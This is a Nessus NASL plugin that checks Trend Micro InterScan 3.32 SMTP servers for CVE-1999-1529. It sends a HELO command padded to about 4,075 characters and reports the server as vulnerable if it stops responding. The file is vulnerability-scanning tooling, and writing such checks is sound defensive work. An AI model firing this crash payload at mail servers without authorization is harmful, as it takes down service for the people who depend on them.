#
# This script was written by Alain Thivillon <Alain.Thivillon@hsc.fr>
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#
# Changes by Tenable:
# - Revised plugin title (5/24/12)
# - Edited synopsis and updated copyright (5/29/12)

include("compat.inc");

if (description)
{
 script_id(10353);
 script_version("$Revision: 1.34 $");
 script_cvs_date("$Date: 2015/11/18 21:03:57 $");

 script_cve_id("CVE-1999-1529");
 script_bugtraq_id(787);
 script_osvdb_id(6174, 6176);

 script_name(english:"Trend Micro InterScan 3.32 SMTP HELO Command Remote Overflow DoS");
 script_summary(english:"Crashes the Interscan NT SMTP Server");

 script_set_attribute(attribute:"synopsis", value:"The remote MTA is vulnerable to a denial of service attack.");
 script_set_attribute(attribute:"description", value:
"It was possible to perform a denial of service against the remote
Interscan SMTP server by sending it a special long HELO command.

This problem allows an attacker to prevent your Interscan SMTP server
from handling requests.");
 script_set_attribute(attribute:"solution", value:"Contact your vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/11/08");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/04/17");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2015 Renaud Deraison and Alain Thivillon");
 script_family(english:"SMTP problems");

 script_dependencie("smtpserver_detect.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/smtp", 25);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if(!get_port_state(port))exit(0);

banner = get_smtp_banner (port:port);
if ("InterScan" >!< banner)
  exit (0);

 soc = open_sock_tcp(port);
 if(soc)
 {
   s = smtp_recv_banner(socket:soc);
   if(s)
   {
   c = string("HELO a\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:5000);
   if(!s)exit(0);
   c = string("HELO ", crap(length:4075, data:"."),"\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:5000);
   if(!s) { security_warning(port); exit(0) ; }
   c = string("HELO a\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:2048, timeout:20);
   if(!s) { security_warning(port); exit(0); }
   }
   close(soc);
 }

